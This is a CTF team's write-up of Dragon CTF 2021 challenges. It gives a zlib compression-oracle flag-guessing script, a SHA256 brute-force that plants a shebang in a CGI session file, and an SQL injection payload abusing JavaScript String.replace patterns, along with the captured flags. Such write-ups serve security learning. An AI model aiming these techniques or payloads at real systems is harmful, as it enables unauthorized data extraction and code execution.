# Dragon CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20211127-dragonctf2021/) of this writeup.**


 - [Dragon CTF 2021](#dragon-ctf-2021)
   - [Crypto](#crypto)
     - [CRC Recursive Challenge](#crc-recursive-challenge)
   - [Misc](#misc)
     - [Compress The Flag](#compress-the-flag)
     - [CTF Gateway Interface](#ctf-gateway-interface)
   - [Web](#web)
     - [Webpwn](#webpwn)
   - [Pwn](#pwn)
     - [Shellcode_verifier](#shellcode_verifier)
     - [Dragonbox](#dragonbox)



## Crypto
### CRC Recursive Challenge
[Code](https://gist.github.com/sasdf/78fa4f4c9dc9db93534e4742b1de92e1)


## Misc

### Compress The Flag

> bookgin


We got firstblood of this challenge!

If the charater we guessed is correct, zlib compressed size will remain the same.

```python=
#!/usr/bin/env python3
import socket
import string
chars = string.ascii_uppercase + 'grn{}'

def get_zlib(res):
    for l in res.decode().splitlines():
        if 'zlib' in l:
            return int(l.strip().rpartition(' ')[-1])
    assert False

def guess_with_prefix(flag):
    if len(flag) == 25:
        print(flag)
        import random
        random.seed(0)
        l = [i for i in range(25)]
        random.shuffle(l)
        print(l)
        new_l = [None for _ in range(25)]
        for src, dst in enumerate(l):
            new_l[dst] = flag[src]

        print(''.join(new_l))
        # DrgnS{THISISACRIMEIGUESS}
        exit(0)
    print('guess prefix ' + repr(flag))
    gz2cs = {}
    for c in chars:
        print('g', c)
        guess = (flag + c) * 30
        s.sendall(('0:' + guess + '\n').encode())
        gz = get_zlib(s.recv(4096))
        gz2cs[gz] = gz2cs.get(gz, '') + c
    min_gz = min(gz2cs.keys())
    if len(gz2cs[min_gz]) == len(chars):
        print('give up prefix ' + repr(flag))
        return
    for c in gz2cs[min_gz]:
        guess_with_prefix(flag + c)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    #s.connect(('127.0.0.1', 1337))
    s.connect(('compresstheflag.hackable.software', 1337))
    s.recv(1024)
    guess_with_prefix('')
```

### CTF Gateway Interface

> written by bookgin, solved by ginoah

In the session file, though we can run it through `/cgi-bin/session_<HEX>`, but the content is a SHA256 hash which cannot be easily controlled.

Fortunately, in order to get the flag, we just need to run `./x`. Therefore, we can brute-force the hash to make the start of the hash become *shebang* `#!x\n`.

Brute-force 4 bytes in SHA256 is doable.

```python
#!/usr/bin/python3
import hashlib
import os
import sys
import random
SALT = b"SaltyMcSaltFace"

while True:
    password = str(random.randint(0, 0x100000000000000)).encode()
    hash = hashlib.sha256(SALT + password).digest()
    if hash.startswith(b'#!x\n'):
        open('log', 'a').write(repr(password) + ':' + repr(hash[:4]) + '\n')
        
# 53594042019754885 - > #!x\n
```

Next, visit the following link to run `x` and retrieve the flag.

```sh
/cgi-bin/startAuth.cgi?password=53594042019754885
/cgi-bin/session_bab090dafa836740e3b10e4f7ad167988afb06f2
```

Flag: `DrgnS{valisMadeMeChangeTheFlagPfff}`

## Web

### Webpwn

> written by bookgin, solved by Paul Huang, kaibro, ginoah

javascript String.replace supports [some interesting feature](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace). This bug/feature is even [present in CTFd](https://github.com/CTFd/CTFd/issues/1662)


session is aac762ef0044d46ad245622acf5c6f35.
Here is the payload:

```
{
    "key":"IS NULL),($$$$e2$$$$,$$$$aac762ef0044d46ad245622acf5c6f35$$$$,(select flag from flag))--",
    "data":"$`"
}

```

flag is in the note of e2
`DrgnS{Everything_is_easy_wh3n_y0u_have_$$$_4b8c61}`


## Pwn


### Shellcode_verifier
[script](https://github.com/st424204/ctf_practice/tree/master/Dragon_CTF_2021/Shellcode_verifier)

### Dragonbox
[script](
https://github.com/st424204/ctf_practice/tree/master/Dragon_CTF_2021/Dragonbox)
